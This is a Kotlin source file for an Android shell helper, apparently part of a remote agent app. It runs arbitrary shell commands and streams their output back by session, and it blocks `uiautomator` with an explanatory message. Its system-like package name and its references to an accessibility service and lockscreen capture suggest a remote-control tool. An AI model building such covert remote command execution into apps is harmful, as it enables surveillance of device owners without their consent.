package com.android.systemservices

import android.util.Log
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

class ShellHelper {

    private val TAG = "ShellHelper"

    companion object {
        // `uiautomator` (dump/events/runtest) registers a UiTestAutomationService, gated by
        // RETRIEVE_WINDOW_CONTENT — held by the adb `shell` uid but NOT the agent's app uid, so the
        // spawned process crash-loops with a SecurityException (and would also fight the agent's own
        // AccessibilityService). Matched only at a command position (start or after ; & | ( ) so a
        // `grep uiautomator` is unaffected. The live UI hierarchy is already exposed via the Screen
        // Text tab (screen_text_data) / lockscreen_layout, so we short-circuit with guidance.
        private val UIAUTOMATOR_RE = Regex("""(^|[;&|(]\s*)(/system/bin/)?uiautomator\b""")
    }

    @Volatile private var activeProcess: Process? = null
    @Volatile private var activeThread: Thread? = null
    @Volatile var running = false

    fun exec(command: String, sessionId: String, onChunk: (JSONObject) -> Unit) {
        stop() // kill any previous session
        if (UIAUTOMATOR_RE.containsMatchIn(command)) {
            onChunk(JSONObject().apply {
                put("sessionId", sessionId)
                put("stream", "stderr")
                put("line", "uiautomator can't run from the agent shell — it needs the adb 'shell' uid " +
                        "(RETRIEVE_WINDOW_CONTENT) and conflicts with the agent's accessibility service. " +
                        "Use the Screen Text tab for the live UI hierarchy.")
            })
            onChunk(JSONObject().apply {
                put("sessionId", sessionId)
                put("stream", "exit")
                put("exitCode", 126)
            })
            Log.i(TAG, "Shell exec blocked uiautomator (session=$sessionId): $command")
            return
        }
        running = true
        activeThread = Thread {
            var proc: Process? = null
            try {
                proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                activeProcess = proc

                // Stream stdout and stderr merged
                val stdout = BufferedReader(InputStreamReader(proc.inputStream))
                val stderr = BufferedReader(InputStreamReader(proc.errorStream))

                // Read stdout in this thread
                val stdoutThread = Thread {
                    try {
                        var line: String?
                        while (stdout.readLine().also { line = it } != null) {
                            if (!running) break
                            onChunk(JSONObject().apply {
                                put("sessionId", sessionId)
                                put("stream", "stdout")
                                put("line", line)
                            })
                        }
                    } catch (_: Exception) {}
                }.also { it.isDaemon = true; it.start() }

                // Read stderr in separate thread
                val stderrThread = Thread {
                    try {
                        var line: String?
                        while (stderr.readLine().also { line = it } != null) {
                            if (!running) break
                            onChunk(JSONObject().apply {
                                put("sessionId", sessionId)
                                put("stream", "stderr")
                                put("line", line)
                            })
                        }
                    } catch (_: Exception) {}
                }.also { it.isDaemon = true; it.start() }

                val exitCode = proc.waitFor()
                stdoutThread.join(2000)
                stderrThread.join(2000)

                onChunk(JSONObject().apply {
                    put("sessionId", sessionId)
                    put("stream", "exit")
                    put("exitCode", exitCode)
                })
            } catch (e: Exception) {
                if (running) {
                    Log.e(TAG, "exec error: ${e.message}")
                    onChunk(JSONObject().apply {
                        put("sessionId", sessionId)
                        put("stream", "error")
                        put("line", e.message ?: "Unknown error")
                    })
                }
            } finally {
                running = false
                activeProcess = null
                activeThread  = null
                try { proc?.destroy() } catch (_: Exception) {}
            }
        }.also {
            it.isDaemon = true
            it.name = "Shell-$sessionId"
            it.start()
        }
        Log.i(TAG, "Shell exec started: $command (session=$sessionId)")
    }

    fun stop() {
        running = false
        try { activeProcess?.destroy() } catch (_: Exception) {}
        activeProcess = null
        activeThread?.interrupt()
        activeThread = null
    }
}
